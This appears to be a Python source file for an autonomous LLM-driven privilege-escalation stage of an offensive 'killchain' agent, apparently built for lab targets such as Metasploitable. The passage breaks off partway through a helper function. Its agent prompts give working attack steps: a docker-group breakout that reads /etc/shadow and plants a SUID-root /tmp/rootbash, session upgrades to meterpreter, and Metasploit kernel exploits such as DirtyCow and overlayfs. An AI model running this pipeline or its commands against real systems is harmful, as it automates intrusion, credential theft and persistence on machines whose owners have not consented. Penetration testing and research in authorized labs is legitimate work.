"""
PrivEsc Subgraph — Escalate privileges from user to root on a compromised target.

Fourth stage of the killchain: recon → initial_access → persistence → **privesc** → impact.
Produces structured PrivEscFindings for downstream consumption.

Architecture:
    Enumerator ⟷ SSH/MSF → Planner ⟷ RAG → Executor ⟷ SSH/MSF → Critic (3-way)
                                                                        ↓
                                                                 PASS → END
                                                                 FAIL_ENUM → Enumerator
                                                                 FAIL_TECHNIQUE → Planner
                                                                 FAIL_EXEC → Executor

Smart skip: if access_level == "root", returns immediately.

Usage:
    python stages/privesc.py                  # Interactive standalone mode
    python stages/privesc.py --graph          # Print graph topology
    from stages.privesc import run_privesc    # Programmatic subgraph call
"""

import sys
import json
import re
import time
import operator
import concurrent.futures
from typing import TypedDict, Annotated, List, Literal

from langchain_core.messages import BaseMessage, HumanMessage, AIMessage, ToolMessage
from langchain_core.tools import tool
from langgraph.graph import StateGraph, END
from langgraph.prebuilt import ToolNode
from langgraph.checkpoint.memory import MemorySaver

from core_agents.common import (
    Colors, print_colored, call_llm, parse_json_response,
    run_ssh_command, KALI_IP, MODEL_NAME, FORBIDDEN_COMMANDS,
)
from core_agents.state import PrivEscFindings
from core_agents import eval_flags
from tools.rag import query_knowledge_base
from tools.metasploit_tools import msf_session, tool_session_command

# =============================================================================
# CONSTANTS
# =============================================================================

MAX_PRIVESC_RETRIES = 8
MAX_ENUM_TOOL_CALLS = 8
MAX_PLANNER_TOOL_CALLS = 5
MAX_EXECUTOR_TOOL_CALLS = 12
# Hard wall-clock cap on the WHOLE escalate attempt. When this cap is hit we stop
# streaming and return best-effort findings (clean "couldn't escalate"), so the
# graph still reaches EXECUTION COMPLETE.
#
# Sizing: the first enumeration turn is expensive — a command_shell->meterpreter
# upgrade (~90s MSF call) plus local_exploit_suggester (~90s) plus the manual
# sudo/SUID/kernel/cap scans easily burn 200-250s BEFORE a single technique is
# even attempted. At 300s only ONE enum->plan->exec->critic cycle fit, so when the
# first-chosen vector failed (e.g. SUID, a losing path on Metasploitable 3) there
# was no budget left for the critic's FAIL_TECHNIQUE->planner loop to cycle to
# sudo/kernel/capabilities — privesc time-boxed after exactly one vector
# (flaw_privesc v0 scored 0/5). The subagent already supports cycling
# (MAX_PRIVESC_RETRIES=8); the cap, not the design, was the limiter. 600s leaves
# ~350s after enumeration for 3-4 additional technique cycles (each re-enters at
# the planner, so enumeration is NOT repeated), enough to reach a working vector.
PRIVESC_WALLCLOCK_TIMEOUT = 600  # seconds

# =============================================================================
# STATE
# =============================================================================

class PrivEscState(TypedDict):
    messages: Annotated[List[BaseMessage], operator.add]
    target_ip: str
    session_id: str
    session_type: str           # "command_shell" | "meterpreter"
    access_level: str           # "user" | "root"
    os_info: str                # "Ubuntu 18.04" etc.
    objective: str
    enum_results: str           # Accumulated enumeration output
    escalation_plan: str        # Planner's chosen technique + steps
    escalation_result: str      # Executor's summary
    loop_step: int
    critic_verdict: str         # "PASS" | "FAIL_ENUM" | "FAIL_TECHNIQUE" | "FAIL_EXEC"

# =============================================================================
# TOOL DEFINITIONS
# =============================================================================

# Hard wall-clock caps (seconds) for blocking RPC/session calls. The underlying
# send_command / run_session_command have their own read-loop timeouts, but a
# blocking 'run'/'exploit' MSF command (or a wedged session) can keep the
# console 'busy' for minutes. We enforce a hard ceiling here so a single tool
# call can never hang the whole stage.
_MSF_WALLCLOCK_TIMEOUT = 90      # outer cap for tool_metasploit_rpc
_MSF_SEND_TIMEOUT = 85           # inner send_command read-loop timeout
_SESSION_WALLCLOCK_TIMEOUT = 20  # outer cap for a single session command


def _run_with_timeout(fn, args=(), kwargs=None, timeout=20, on_timeout="(timed out)"):
    """Run a blocking callable with a hard wall-clock cap. Returns the result,
    or `on_timeout` if it does not complete in time, or an error string on
    exception. The worker thread is abandoned (daemon-style) on timeout so the
    stage never blocks waiting for it."""
    kwargs = kwargs or {}
    ex = concurrent.futures.ThreadPoolExecutor(max_workers=1)
    try:
        fut = ex.submit(fn, *args, **kwargs)
        try:
            return fut.result(timeout=timeout)
        except concurrent.futures.TimeoutError:
            return on_timeout
        except Exception as e:  # surface the underlying error rather than hang
            return f"(call failed: {e})"
    finally:
        # Do NOT block on lingering worker; let it die in the background.
        ex.shutdown(wait=False)


def _session_command_capped(session_id: str, command: str,
                            timeout: int = _SESSION_WALLCLOCK_TIMEOUT) -> str:
    """Invoke tool_session_command with a hard wall-clock cap, so a wedged
    session or a blocked shell_write RPC can never stall the stage."""
    return str(_run_with_timeout(
        tool_session_command.invoke,
        args=({"session_id": session_id, "command": command},),
        timeout=timeout,
        on_timeout=f"(session command timed out after {timeout}s — treating as failure)",
    ))


@tool
def tool_linux_terminal(command: str):
    """
    Execute a shell command on the KALI ATTACKER machine via SSH.
    This runs on Kali — NOT on the target. Use ONLY for Kali-side tasks:
    - Hosting exploits, starting listeners, compiling payloads.

    To run commands on the TARGET, use tool_session_command instead.

    NON-INTERACTIVE ONLY. No ftp, ssh, vi, nano, top.
    """
    if any(bad in command for bad in FORBIDDEN_COMMANDS):
        return "Command blocked by safety guardrails."
    print_colored(f"\n[PrivEsc Terminal] Executing: {command}", Colors.OKCYAN)
    return run_ssh_command(command)


@tool
def tool_metasploit_rpc(command: str):
    """
    Execute a command on the Metasploit CONSOLE.
    Use ONLY for MSF console commands: listing sessions, background, use, set, run,
    post modules (local_exploit_suggester, escalate modules).

    Do NOT use this for running commands on the target — use tool_session_command instead.
    - 'sessions' to list sessions (do NOT use -i flag)
    - 'run post/multi/recon/local_exploit_suggester' for automated suggestions
    """
    # Enforce a hard wall-clock cap. send_command's own timeout only fires when
    # the console reports 'busy == False'; a blocking 'run'/'exploit' callback
    # can keep it busy for minutes. The outer ThreadPoolExecutor guarantees this
    # call returns within ~90s no matter what the console does.
    result = _run_with_timeout(
        msf_session.send_command,
        args=(command,),
        kwargs={"timeout": _MSF_SEND_TIMEOUT},
        timeout=_MSF_WALLCLOCK_TIMEOUT,
        on_timeout=(
            f"MSF command timed out after {_MSF_WALLCLOCK_TIMEOUT}s — treating as "
            "failure. The module likely blocked waiting for a callback; try a "
            "different, non-blocking technique."
        ),
    )
    if isinstance(result, str) and result.startswith("(call failed:"):
        return f"RPC Error: {result}"
    return result


# Tool sets
ENUM_TOOLS = [tool_linux_terminal, tool_metasploit_rpc, tool_session_command]
PLANNER_TOOLS = [query_knowledge_base]
EXECUTOR_TOOLS = [tool_linux_terminal, tool_metasploit_rpc, tool_session_command]

# =============================================================================
# SYSTEM PROMPTS
# =============================================================================

ENUMERATOR_PROMPT = f"""You are a Privilege Escalation Enumerator for a Red Team agent. Your attacker IP is {KALI_IP}.

You have 3 tools — each runs in a DIFFERENT place:

**TOOL CLARITY:**
- `tool_session_command(session_id, command)` → runs ON THE TARGET (use for ALL enumeration commands)
- `tool_linux_terminal(command)` → runs ON KALI only (hosting exploits, starting listeners)
- `tool_metasploit_rpc(command)` → MSF console only (listing sessions, running post modules like local_exploit_suggester)

**CRITICAL:** To run enumeration commands ON THE TARGET, use `tool_session_command`.
Do NOT use `tool_linux_terminal` for enumeration — that would scan Kali, not the target!
Do NOT use `tool_metasploit_rpc` for target commands — use it only for MSF console operations.

**Your job:** Run enumeration commands on the target to discover privilege escalation vectors.

**Enumeration checklist — run these in order of priority (via tool_session_command):**

1. **Basic info**: `whoami`, `id`, `uname -a` (via tool_session_command).
   **READ THE `id` OUTPUT FOR GROUP MEMBERSHIP.** If `groups` / `id` shows the
   current user is in the **`docker`** group (e.g. `groups=100(users),999(docker)`),
   that is a NEAR-CERTAIN root vector — the docker daemon runs as root, so a group
   member can mount the host filesystem in a container and act as root. Flag it
   LOUDLY under `Docker group:` and as the TOP recommended vector; it beats
   suid/sudo/kernel and should be tried FIRST. If unsure, also run
   `groups` and `docker ps 2>/dev/null` to confirm docker is reachable.
2. **Upgrade to meterpreter if the session is a command_shell (DO THIS BEFORE the suggester).**
   `local_exploit_suggester` and every MSF local kernel-exploit require a
   METERPRETER session. The SESSION you were handed is almost always a
   command_shell on legacy targets. So FIRST upgrade it:
   `tool_metasploit_rpc("sessions -u <session_id>")`. Watch the output for
   `Meterpreter session N opened` — that N is your NEW meterpreter session id.
   Use N for the suggester in step 3, and REPORT it in your summary
   (`Meterpreter session:` field) so the planner/executor reuse it. If the
   session is already meterpreter, skip this step. If the upgrade fails, note it
   and continue manually — the manual vectors below don't need meterpreter.
3. **Auto-suggester (do this right after the upgrade)**:
   `tool_metasploit_rpc("run post/multi/recon/local_exploit_suggester SESSION=<meterpreter_session_id>")`
   — auto-enumerates kernel and local exploit candidates. Fast and high-yield; run
   it before the slow manual scans below. Record EVERY module it marks
   "appears to be vulnerable" / "the target appears to be vulnerable" — these are
   the kernel path and are reported under `Suggested local exploits:`.
4. **Sudo check**: `sudo -l` (most common privesc vector)
5. **SUID binaries**: `find / -perm -4000 -type f 2>/dev/null`
6. **Cron jobs**: `cat /etc/crontab`
7. **Kernel version**: `uname -r` (for kernel exploit matching)
8. **Running processes**: `ps aux | head -30`
9. **Capabilities**: `getcap -r / 2>/dev/null` (cap_setuid/cap_net_raw etc.)

**Rules:**
1. Execute commands ONE AT A TIME
2. READ outputs carefully — look for escalation vectors
3. Do NOT run more than {MAX_ENUM_TOOL_CALLS} commands
4. When done, provide a TEXT SUMMARY of all findings

**Output (final text — no more tool calls):**

ENUMERATION RESULTS:
- OS: <version>
- Kernel: <version>
- Current user: <username>
- Docker group: <'YES — user in docker group (PREFERRED root vector)' if `id`/`groups` shows the docker group, else 'no'>
- Meterpreter session: <new meterpreter session id from the step-2 upgrade, or 'n/a' if already meterpreter / upgrade failed>
- Suggested local exploits: <modules local_exploit_suggester flagged vulnerable, or 'none/suggester unavailable'>
- Sudo rights: <what sudo -l returned>
- SUID binaries: <notable ones>
- Cron jobs: <any writable or interesting>
- Capabilities: <any cap_setuid/cap_net_raw etc.>
- Other vectors: <anything else found>
- RECOMMENDED VECTORS: <top 2-3 most promising escalation paths>
"""

PLANNER_PROMPT = f"""You are a Privilege Escalation Planner for a Red Team agent. Your attacker IP is {KALI_IP}.

You receive:
1. ENUMERATION RESULTS — output from the enumerator's scans
2. TARGET INFO — IP, OS, kernel, current access level
3. CRITIC FEEDBACK — if retrying, what went wrong

**You have access to `query_knowledge_base`** — search for specific escalation techniques.
Use verbose queries (e.g., "Linux privilege escalation via sudo misconfiguration NOPASSWD nmap GTFObins").
You may make up to {MAX_PLANNER_TOOL_CALLS} queries.

**IMPORTANT — command_shell vs meterpreter (this unlocks the kernel path):**
`local_exploit_suggester` and most MSF local kernel-exploits require a
METERPRETER session. If the current session is a command_shell, the FIRST plan
step should UPGRADE it: `sessions -u <session_id>` (or `use
post/multi/manage/shell_to_meterpreter; set SESSION <id>; set LHOST {KALI_IP};
run`). Then run the suggester and fire the suggested kernel module against the
NEW meterpreter session id. On an OLD kernel (3.x — common on legacy targets like
Metasploitable), the **kernel exploit is often the ONLY way to root** when sudo/
SUID/cron don't apply, so try it EARLY: `exploit/linux/local/overlayfs_priv_esc`
(CVE-2015-1328) and `exploit/linux/local/cve_2016_5195_dirtycow` (DirtyCow).

**Technique priority (based on enumeration results):**

-1. **Docker group (PREFERRED — try FIRST when available).** If the enumeration
   results show the current user is in the **`docker`** group (`id`/`groups`
   contains `docker`, e.g. `groups=100(users),999(docker)`), this is a
   near-certain root vector — do NOT waste budget on suid/sudo/kernel first.
   The docker daemon runs as root; a group member mounts the host FS in a
   container and acts as root.
   TECHNIQUE: docker_group breakout.
   **The session is a command_shell — the procedure MUST be NON-INTERACTIVE.
   NEVER use `docker run -it` / `-i` / `-t` (they wait on a TTY and HANG the
   session).** Robust non-interactive procedure:
     1. Discover a local image dynamically: `docker images -q | head -n1`
        (grab the id into a var, e.g. `IMG=$(docker images -q | head -n1)`).
        If NO local image exists, first `docker pull busybox` (or alpine) and
        use that as `$IMG`.
     2. Run ONE non-interactive container that mounts the host root and chroots
        it to act as root on the host FS, proving root and planting proof:
        `IMG=$(docker images -q | head -n1); docker run -v /:/mnt --rm $IMG chroot /mnt sh -c 'id; head -1 /etc/shadow; cp /bin/bash /tmp/rootbash 2>/dev/null; chmod 4755 /tmp/rootbash; id -u > /tmp/.docker_root_uid'`
        (`--rm`, no `-it`; the `sh -c '...'` returns immediately).
     3. This plants a SUID-root `/tmp/rootbash` on the HOST. Confirm root from
        the ORIGINAL session non-interactively: `/tmp/rootbash -p -c 'id'`
        (a SUID `bash -p` keeps euid=0 → `id` shows `euid=0(root)`). The chroot
        `id` (uid=0) and the `/etc/shadow` first line are also root proof.
   EXPECTED_RESULT: chroot `id` shows `uid=0(root)`, /etc/shadow readable, and
   `/tmp/rootbash -p -c id` reports `euid=0(root)`.

0. **local_exploit_suggester hits** — if the enumeration results contain
   `local_exploit_suggester` output listing one or more "appears to be
   vulnerable" / "the target appears to be vulnerable" modules, PRIORITIZE the
   top-ranked suggested MSF module (run it via tool_metasploit_rpc with the
   correct SESSION) before falling back to the manual techniques below.
1. **Sudo misconfig** — `sudo -l` shows NOPASSWD entries → check GTFOBins for that binary
2. **SUID abuse** — SUID binaries that allow shell escape (find, vim, python, nmap, etc.)
3. **Cron job abuse** — Writable cron scripts running as root
4. **Writable PATH** — PATH dirs writable + cron/service runs a command without full path
5. **Kernel exploit** — Match kernel version against known exploits (DirtyPipe, DirtyCow, etc.)
6. **Capabilities** — cap_setuid or other dangerous capabilities
7. **MSF post modules** — `post/multi/recon/local_exploit_suggester`, `post/linux/escalate/*`

**Output format (final answer — no more tool calls):**

ESCALATION PLAN:
TECHNIQUE: <method name>
VECTOR: <specific binary/cron/kernel version being exploited>
STEPS:
1. <exact command>
2. <exact command>
...
EXPECTED_RESULT: "whoami returns root" or "id shows uid=0"

**On retry:**
- Read critic feedback carefully
- Choose a DIFFERENT technique
- If FAIL_ENUM: you'll receive new enumeration data
- If FAIL_TECHNIQUE: the technique was wrong, pick another from the enum results
"""

EXECUTOR_PROMPT = f"""You are a Privilege Escalation Executor for a Red Team agent. Your attacker IP is {KALI_IP}.

You have 3 tools — each runs in a DIFFERENT place:

**TOOL CLARITY:**
- `tool_session_command(session_id, command)` → runs ON THE TARGET (use for ALL escalation commands)
- `tool_linux_terminal(command)` → runs ON KALI only (hosting exploits, starting listeners, compiling payloads)
- `tool_metasploit_rpc(command)` → MSF console only (listing sessions, running post modules)

**CRITICAL:** To run escalation commands ON THE TARGET, use `tool_session_command`.
Only use `tool_linux_terminal` for Kali-side tasks (hosting exploits, starting listeners).

**Your job:** Execute the escalation plan step by step ON THE TARGET.

**Session recovery:** If `tool_session_command` returns "Error: Session X not found", the session died mid-execution. Immediately:
1. Call `tool_metasploit_rpc('sessions')` to list all active sessions.
2. If a session to the target exists, switch to that session_id for all subsequent commands.
3. If no session exists, stop and report 'SESSION LOST — escalation aborted mid-execution' so the critic can classify it correctly.
Do NOT continue executing plan steps against a dead session.

**Rules:**
1. Execute commands ONE AT A TIME
2. READ each output carefully
3. After the escalation attempt, ALWAYS verify with `tool_session_command(session_id, "whoami")` and `tool_session_command(session_id, "id")`
4. If `whoami` returns `root` or `id` shows `uid=0`, the escalation SUCCEEDED
5. Do NOT run more than {MAX_EXECUTOR_TOOL_CALLS} commands
6. **Docker-group breakout** (when the plan's technique is docker_group): the
   session is a command_shell, so EVERY docker command MUST be NON-INTERACTIVE —
   **never `docker run -it`/`-i`/`-t`** (they block on a TTY and hang the stage).
   Discover an image first (`docker images -q | head -n1`; if none,
   `docker pull busybox` then use it), then run a SINGLE `--rm` container that
   chroots the host FS, e.g.
   `IMG=$(docker images -q | head -n1); docker run -v /:/mnt --rm $IMG chroot /mnt sh -c 'id; head -1 /etc/shadow; cp /bin/bash /tmp/rootbash; chmod 4755 /tmp/rootbash'`.
   Then PROVE root from the session non-interactively with
   `tool_session_command(session_id, "/tmp/rootbash -p -c 'id'")` — expect
   `euid=0(root)`. Do NOT drop into an interactive container or an interactive
   root shell.
7. **MSF local/kernel exploits** (via `tool_metasploit_rpc`): these need a
   meterpreter session. If your session is a command_shell, FIRST upgrade it —
   `tool_metasploit_rpc("sessions -u <session_id>")` — note the new meterpreter
   session id, then run e.g.
   `tool_metasploit_rpc("use exploit/linux/local/overlayfs_priv_esc; set SESSION <mid>; set LHOST {KALI_IP}; run")`.
   `local_exploit_suggester` also needs meterpreter, so upgrade before running it.

**When done, provide a text summary:**
- Did `whoami` return `root`?
- What technique was used?
- Any errors encountered?
"""

CRITIC_PROMPT = f"""You are a Privilege Escalation Critic for a Red Team operation. Your IP is {KALI_IP}.

You evaluate whether privilege escalation succeeded.

**You receive:**
- Enumeration results
- Escalation plan (technique chosen)
- Execution result
- Loop step count

**Primary success criterion:** `whoami` returns `root` OR `id` shows `uid=0(root)`.

**GROUNDING RULE (critical):** You are given a `DIRECT ID CHECK` field — a raw
ground-truth privilege check run by YOU on the target moments ago. It is prefixed
with the session type that was probed:
  - `[command_shell id] ...` → root IFF the output shows `uid=0(root)`.
  - `[meterpreter getuid] ...` → root IFF the output shows `Server username: root`
    (or `uid=0`). On a meterpreter session `id` is NOT a valid command, so
    `getuid` is the authoritative probe — do not expect a `uid=` line here.
  - `[docker rootbash probe] ...` → appears only for a docker-group breakout. A
    docker breakout roots the HOST FS via a container but does NOT change the
    session's own uid, so the `[command_shell id]` line above will still show the
    low-priv user even on SUCCESS — do NOT fail on that alone here. This probe
    runs the SUID-root `/tmp/rootbash` the breakout planted; root IFF it shows
    `uid=0(root)` OR `euid=0(root)`. If this probe shows euid/uid=0, escalation
    SUCCEEDED (PASS). If it errors / shows the low-priv user / 'No such file', the
    breakout did not land — do not PASS on prose.
This field is authoritative. If it shows root by the rule above, escalation
succeeded (PASS) regardless of the prose. If it does NOT (e.g. `uid=1000(vagrant)`,
`Server username: vagrant`, an error, empty, or a timeout message), you MUST NOT
return PASS even if the EXECUTION RESULT prose claims success — the executor is
hallucinating. Classify it as a failure.

**3-way failure classification:**

- **PASS**: `whoami` confirmed root access. Done.
- **FAIL_ENUM**: The enumeration was insufficient — important vectors were missed.
  Use this when: no sudo -l was run, no SUID check, kernel version unknown.
  Action: route back to enumerator for more thorough scanning.
- **FAIL_TECHNIQUE**: The chosen technique was wrong for this target.
  Use this when: the technique was tried but the binary doesn't support shell escape,
  the kernel isn't vulnerable, sudo entry doesn't allow escalation.
  Action: route back to planner to choose a different technique.
- **FAIL_EXEC**: The technique is valid but execution had errors.
  Use this when: correct technique but typos in commands, wrong syntax,
  missing compilation step, wrong file path.
  Action: route back to executor to fix and retry.

**Output format:**

VERDICT: <PASS|FAIL_ENUM|FAIL_TECHNIQUE|FAIL_EXEC>

ASSESSMENT: <2-3 sentence summary>

FEEDBACK: <specific instructions for retry. Be precise:
           FAIL_ENUM → which enumeration commands to run
           FAIL_TECHNIQUE → which alternative technique to try
           FAIL_EXEC → what command to fix and how>
"""

# =============================================================================
# NODE IMPLEMENTATIONS
# =============================================================================

def enumerator_node(state: PrivEscState) -> dict:
    """Run privesc enumeration commands. ReAct loop with SSH/MSF."""
    messages = state["messages"]
    print_colored("\n[PrivEsc Enumerator] Scanning for escalation vectors...", Colors.HEADER)

    # Count enum tool calls in the CURRENT enum turn only.
    # Stop at a HumanMessage that is NOT a CRITIC FEEDBACK message (the turn
    # boundary). A CRITIC FEEDBACK message must NOT stop the scan, otherwise the
    # count is always 0 on retries and the cap never engages.
    enum_tool_count = 0
    for msg in reversed(messages):
        # Stop at the prior enumerator's own final summary so a FAIL_ENUM retry
        # starts a fresh count. Without this, the CRITIC FEEDBACK message (the
        # only boundary on a retry) is skipped and the backward walk keeps
        # counting ToolMessages from the PREVIOUS enum turn, tripping the cap on
        # the first command of the retry.
        # Stop at ANY PrivEsc stage marker AIMessage — not just the enumerator's.
        # On a FAIL_EXEC retry the most recent non-CRITIC-FEEDBACK HumanMessage is
        # the original init message (far back). Without stopping at the Planner /
        # Executor / Critic markers, the backward walk scans past executor
        # ToolMessages and counts them, prematurely tripping the enum cap and
        # forcing an immediate summarize call before any enumeration is issued.
        if isinstance(msg, AIMessage) and any(
            tag in (msg.content or "")
            for tag in ("[PrivEsc Enumerator]", "[PrivEsc Planner]",
                        "[PrivEsc Executor]", "[PrivEsc Critic]")
        ):
            break
        if isinstance(msg, HumanMessage) and "CRITIC FEEDBACK" not in msg.content:
            break
        if isinstance(msg, ToolMessage):
            enum_tool_count += 1

    if enum_tool_count == 0:
        context = (
            f"TARGET: {state.get('target_ip', '')}\n"
            f"OS: {state.get('os_info', 'unknown')}\n"
            f"SESSION: {state.get('session_type', '')} (ID: {state.get('session_id', '')})\n"
            f"CURRENT ACCESS: {state.get('access_level', 'user')}\n"
        )
        # Include critic feedback if retrying
        for msg in reversed(messages):
            if isinstance(msg, HumanMessage) and "CRITIC FEEDBACK" in msg.content:
                context += f"\nCRITIC FEEDBACK:\n{msg.content}\n"
                break
        enum_msgs = [HumanMessage(content=context)]
    else:
        # Continuing ReAct — use recent messages
        enum_msgs = list(messages[-min(12, len(messages)):])
        # On a FAIL_ENUM retry, the recent window may not contain the critic
        # feedback, so the enumerator can't tell which vectors it missed and
        # tends to re-run already-executed commands. Prepend the most recent
        # CRITIC FEEDBACK message if it isn't already in the window.
        feedback_msg = None
        for msg in reversed(messages):
            if isinstance(msg, HumanMessage) and "CRITIC FEEDBACK" in (msg.content or ""):
                feedback_msg = msg
                break
        if feedback_msg is not None and feedback_msg not in enum_msgs:
            enum_msgs = [feedback_msg] + enum_msgs
        # Enforce pair safety: a sliding window or a prepend can place an
        # orphaned ToolMessage at the front, causing an OpenAI 400 error.
        enum_msgs = _make_pair_safe(enum_msgs)

    if enum_tool_count >= MAX_ENUM_TOOL_CALLS:
        print_colored(f"[PrivEsc Enumerator] Tool cap ({enum_tool_count}).", Colors.WARNING)
        response = call_llm(
            messages=enum_msgs + [HumanMessage(content=(
                "Max enumeration commands reached. Summarize all findings now."
            ))],
            system_prompt=ENUMERATOR_PROMPT
        )
    else:
        response = call_llm(
            messages=enum_msgs,
            system_prompt=ENUMERATOR_PROMPT,
            tools=ENUM_TOOLS
        )

    if response.content and not response.tool_calls:
        return {
            "messages": [AIMessage(content=f"[PrivEsc Enumerator] {response.content}")],
            "enum_results": response.content,
        }

    return {"messages": [response]}


def planner_node(state: PrivEscState) -> dict:
    """Choose escalation technique based on enum results. ReAct with RAG."""
    messages = state["messages"]
    print_colored("\n[PrivEsc Planner] Selecting technique...", Colors.HEADER)

    # Count RAG calls in the CURRENT planning turn only. Stop at the most recent
    # enumerator handoff OR a CRITIC FEEDBACK message (whichever is later), so
    # prior planner passes don't accumulate and prematurely trip the cap.
    planner_tool_count = 0
    for msg in reversed(messages):
        if (isinstance(msg, AIMessage) and "[PrivEsc Enumerator]" in (msg.content or "")) or \
           (isinstance(msg, HumanMessage) and "CRITIC FEEDBACK" in msg.content):
            break
        if isinstance(msg, ToolMessage):
            planner_tool_count += 1

    if planner_tool_count == 0:
        enum_results = state.get("enum_results", "")
        context = (
            f"ENUMERATION RESULTS:\n{enum_results}\n\n"
            f"TARGET: {state.get('target_ip', '')}\n"
            f"OS: {state.get('os_info', 'unknown')}\n"
            f"CURRENT ACCESS: {state.get('access_level', 'user')}\n"
        )
        # Deterministic feasibility nudge (design law: strategic bias in code, not
        # left to the LLM): if enumeration shows docker-group membership, docker is
        # the PREFERRED near-certain root vector — inject a loud banner so the
        # planner reaches for it FIRST instead of burning budget on suid/sudo.
        if _user_in_docker_group(enum_results):
            context = (
                "*** DOCKER GROUP DETECTED — the current user is in the `docker` "
                "group. This is a near-certain root vector; the docker daemon runs "
                "as root, so mount the host FS in a NON-INTERACTIVE container and "
                "act as root. Choose TECHNIQUE: docker_group breakout FIRST — do "
                "NOT try suid/sudo/kernel before it. NEVER use `docker run -it` "
                "(it hangs the command_shell). ***\n\n"
            ) + context
        for msg in reversed(messages):
            if isinstance(msg, HumanMessage) and "CRITIC FEEDBACK" in msg.content:
                context += f"\nPREVIOUS FAILURE:\n{msg.content}\n"
                break
        planner_msgs = [HumanMessage(content=context)]
    else:
        # Continuing ReAct — start from the current planning turn boundary
        # (most recent enumerator handoff or CRITIC FEEDBACK message).
        start = 0
        for i in range(len(messages) - 1, -1, -1):
            mi = messages[i]
            if (isinstance(mi, AIMessage) and "[PrivEsc Enumerator]" in (mi.content or "")) or \
               (isinstance(mi, HumanMessage) and "CRITIC FEEDBACK" in (mi.content or "")):
                start = i
                break
        planner_msgs = _make_pair_safe(list(messages[start:]))

    if planner_tool_count >= MAX_PLANNER_TOOL_CALLS:
        print_colored(f"[PrivEsc Planner] RAG cap reached.", Colors.WARNING)
        response = call_llm(
            messages=planner_msgs + [HumanMessage(content="Max queries reached. Produce your final escalation plan.")],
            system_prompt=PLANNER_PROMPT
        )
    else:
        response = call_llm(
            messages=planner_msgs,
            system_prompt=PLANNER_PROMPT,
            tools=PLANNER_TOOLS
        )

    if response.content and not response.tool_calls:
        print_colored(f"[PrivEsc Planner] Plan:\n{response.content[:300]}", Colors.OKGREEN)
        return {
            "messages": [AIMessage(content=f"[PrivEsc Planner] {response.content}")],
            "escalation_plan": response.content,
        }

    return {"messages": [response]}


def executor_node(state: PrivEscState) -> dict:
    """Execute escalation. ReAct loop with SSH/MSF."""
    messages = state["messages"]
    print_colored("\n[PrivEsc Executor] Running escalation...", Colors.HEADER)

    # Count tool calls in the CURRENT executor turn only. Stop at the most recent
    # planner handoff OR CRITIC FEEDBACK message (whichever is later) so prior
    # executor turns don't accumulate and prematurely trip the cap on retries.
    executor_tool_count = 0
    for msg in reversed(messages):
        if (isinstance(msg, AIMessage) and "[PrivEsc Planner]" in (msg.content or "")) or \
           (isinstance(msg, HumanMessage) and "CRITIC FEEDBACK" in msg.content):
            break
        if isinstance(msg, ToolMessage):
            executor_tool_count += 1

    # Build the executor context starting at the current turn boundary: the LAST
    # planner handoff or CRITIC FEEDBACK message, whichever appears later.
    start = None
    for i in range(len(messages) - 1, -1, -1):
        mi = messages[i]
        if (isinstance(mi, AIMessage) and "[PrivEsc Planner]" in (mi.content or "")) or \
           (isinstance(mi, HumanMessage) and "CRITIC FEEDBACK" in (mi.content or "")):
            start = i
            break
    if start is not None:
        executor_msgs = _make_pair_safe(list(messages[start:]))
    else:
        # No clean boundary found. Build a minimal safe context from state
        # rather than handing a bare ToolMessage to the LLM.
        fallback_content = (
            f"Execute escalation on {state.get('target_ip', 'target')}.\n"
            f"Session: {state.get('session_type', '')} (ID: {state.get('session_id', '')})\n"
            f"Plan:\n{state.get('escalation_plan', '(no plan available)')}"
        )
        executor_msgs = [HumanMessage(content=fallback_content)]

    if executor_tool_count >= MAX_EXECUTOR_TOOL_CALLS:
        print_colored(f"[PrivEsc Executor] Tool cap ({executor_tool_count}).", Colors.WARNING)
        # Force one direct ground-truth verification before summarizing, so the
        # cap summary (and the critic) has a real whoami result rather than a
        # context-window guess.
        # Resolve the session privesc actually landed on (upgraded meterpreter /
        # kernel-exploit session), and probe it with the type-appropriate check
        # (id for a shell, getuid for meterpreter — `whoami`/`id` are invalid on
        # meterpreter and would lose the real result).
        sid = _resolve_final_session(state)[0]
        direct_verify = _direct_priv_check(sid, timeout=15) if sid else "(no session_id)"
        direct_verify = str(direct_verify)[:500]
        response = call_llm(
            messages=executor_msgs + [HumanMessage(content=(
                f"DIRECT VERIFICATION (ground-truth privilege check): {direct_verify}\n"
                "Max tool calls reached. Based on this output, report whether "
                "escalation succeeded (root reached?) and what happened."
            ))],
            system_prompt=EXECUTOR_PROMPT
        )
    else:
        response = call_llm(
            messages=executor_msgs,
            system_prompt=EXECUTOR_PROMPT,
            tools=EXECUTOR_TOOLS
        )

    if response.content and not response.tool_calls:
        # Ground the executor's prose summary with the actual raw ToolMessage
        # outputs from the CURRENT executor turn. The critic otherwise only sees
        # the executor LLM's self-reported summary, which can hallucinate a root
        # confirmation. Append the last 3 raw tool outputs (each capped) so the
        # critic evaluates real command responses.
        grounded = _collect_grounded_tool_outputs(executor_msgs)
        if grounded:
            escalation_result = f"{response.content}\n\nGROUNDED TOOL OUTPUTS:\n{grounded}"
        else:
            escalation_result = response.content
        return {
            "messages": [response],
            "escalation_result": escalation_result,
        }

    return {"messages": [response]}


def _make_pair_safe(msgs: List[BaseMessage]) -> List[BaseMessage]:
    """Sanitize a message list so the tool_calls/tool pairing is valid in BOTH
    directions that OpenAI enforces:

      - a role:'tool' message MUST follow an assistant message with tool_calls, and
      - an assistant message with tool_calls MUST be followed by a ToolMessage
        responding to EVERY one of its tool_call_ids (this is the parallel /
        multiple-tool-call case: a window slice can keep the AIMessage while
        dropping some of its responses, leaving orphaned tool_call_ids).

    The previous version only checked that *at least one* ToolMessage followed a
    tool_calls AIMessage, so a message with 2 parallel tool_calls but a single
    response survived and triggered a 400. This rewrite is id-aware and atomic:
    an AIMessage with tool_calls is kept only if EVERY tool_call_id has a matching
    ToolMessage in the immediately-following run; otherwise the whole group is
    dropped. ToolMessages not claimed by a kept AIMessage are dropped.
    """
    if not msgs:
        return msgs

    result: List[BaseMessage] = []
    i = 0
    n = len(msgs)
    while i < n:
        msg = msgs[i]
        if isinstance(msg, AIMessage) and getattr(msg, "tool_calls", None):
            required_ids = [
                tc.get("id") for tc in msg.tool_calls
                if isinstance(tc, dict) and tc.get("id")
            ]
            # Collect the contiguous run of ToolMessages right after this AIMessage,
            # keyed by the tool_call_id they respond to.
            j = i + 1
            responses = {}
            while j < n and isinstance(msgs[j], ToolMessage):
                tcid = getattr(msgs[j], "tool_call_id", None)
                if tcid is not None and tcid not in responses:
                    responses[tcid] = msgs[j]
                j += 1
            if required_ids and all(rid in responses for rid in required_ids):
                # Keep the AIMessage + exactly one ToolMessage per id, in call order.
                result.append(msg)
                for rid in required_ids:
                    result.append(responses[rid])
